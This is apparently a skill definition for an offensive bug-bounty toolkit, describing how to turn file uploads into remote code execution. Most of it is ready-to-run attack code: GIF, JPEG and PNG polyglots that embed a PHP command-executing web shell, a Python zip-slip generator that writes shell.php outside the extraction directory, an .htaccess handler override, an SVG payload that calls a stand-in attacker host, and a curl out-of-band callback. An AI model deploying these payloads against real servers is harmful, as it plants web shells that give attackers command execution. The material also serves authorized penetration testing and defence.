---
name: attack-upload-polyglot
description: "Upload polyglot/RCE — GIFAR/PHP polyglots, image-with-code execution on include, server-side extraction RCE, zip-slip"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - file-upload
  - polyglot
  - rce
  - zip
tech_stack:
  - web
  - php
cwe_ids:
  - CWE-434
  - CWE-1236
chains_with:
  - attack-file-upload
  - attack-upload-bypass
prerequisites:
  - attack-file-upload
---

# Upload Polyglot / RCE

## Objective

The file is stored but does not execute. Turn it into code execution by making the
content a POLYGLOT (valid image AND valid script), or by exploiting server-side
extraction of the archive.

## Methodology

### 1. Which execution path exists? (decides the polyglot)

| Server behavior | Attack |
|---|---|
| PHP `include()` on uploaded file regardless of ext | Any embedded PHP executes — GIF polyglot |
| `.htaccess` upload allowed (or writable) | Upload .htaccess: `AddType application/x-httpd-php .jpg` → all jpg = php |
| Nginx alias misconfig on /files | `location /files { alias /var/www/files/; }` + `/files../` traversal |
| Zip/file-archive auto-extract | zip-slip + arbitrary extension landing (below) |
| Image processing (ImageMagick/gd) | ImageTragick-style CVE via crafted svg/mvg — check parser versions |
| PDF/Office re-rendering | Embedded JS/links execute on open (client-side, medium) |

### 2. Polyglot payloads

```bash
# GIF+PHP (classic — survives getimagesize + serves as image)
echo -e "GIF89a\n\n<?php system(\$_GET['c']); ?>" > shell.gif
# JPEG+PHP via comment
exiftool "-Comment=<?php system(\$_GET['c']); ?>" shell.jpg
# PNG+PHP after IHDR
python3 -c "
import struct
png=open('clean.png','rb').read()
php=b'<?php system(\$_GET[c]);?>'
open('shell.png','wb').write(png[:33]+b'tEXt'+struct.pack('>I',len(php))+php+b'\x00'+png[33:])
"
```

### 3. Zip extraction RCE (zip-slip + ext control)

```python
import zipfile, os
with zipfile.ZipFile('evil.zip','w') as z:
    # path traversal in member name — lands OUTSIDE the extract dir
    z.writestr('../../html/shell.php', '<?php system($_GET[c]);?>')
    # or arbitrary extension INSIDE, if the app whitelists zip but extracts loose
    z.writestr('shell.php', '<?php system($_GET[c]);?>')
```

- Extraction logs/paths visible? → name the traversal precisely
- No traversal but loose extension: the EXTRACTED file's extension is what matters

### 4. Server-side image pipelines

```bash
# SSRF via SVG external references (pair with attack-ssrf)
<svg><image href="http://ATTACKER:8888/svg-fetch"/></svg>
# XXE via SVG/XML (doc-xml sub-skill)
# DoS via decompression bomb (500MB from 10KB png) — authorized tests only
```

### 5. Confirm RCE (no narrative allowed)

- `?c=id;whoami` output visible in response, or
- OOB callback (interactsh) from `system('curl http://oob/')`, or
- Time-based: `?c=sleep 5` vs baseline delta

## Proof

- Execution evidence per the rule above — reflection-only claims are rejected
- Chain documentation: bypass family → polyglot form → execution vector

## Notes

- Cloud static hosting (S3/CDN) NEVER executes php — target the APP server storage
- If storage is S3 + image URL from CDN: stored-XSS via content-type text/html is the
  realistic path (pair attack-xss-stored)
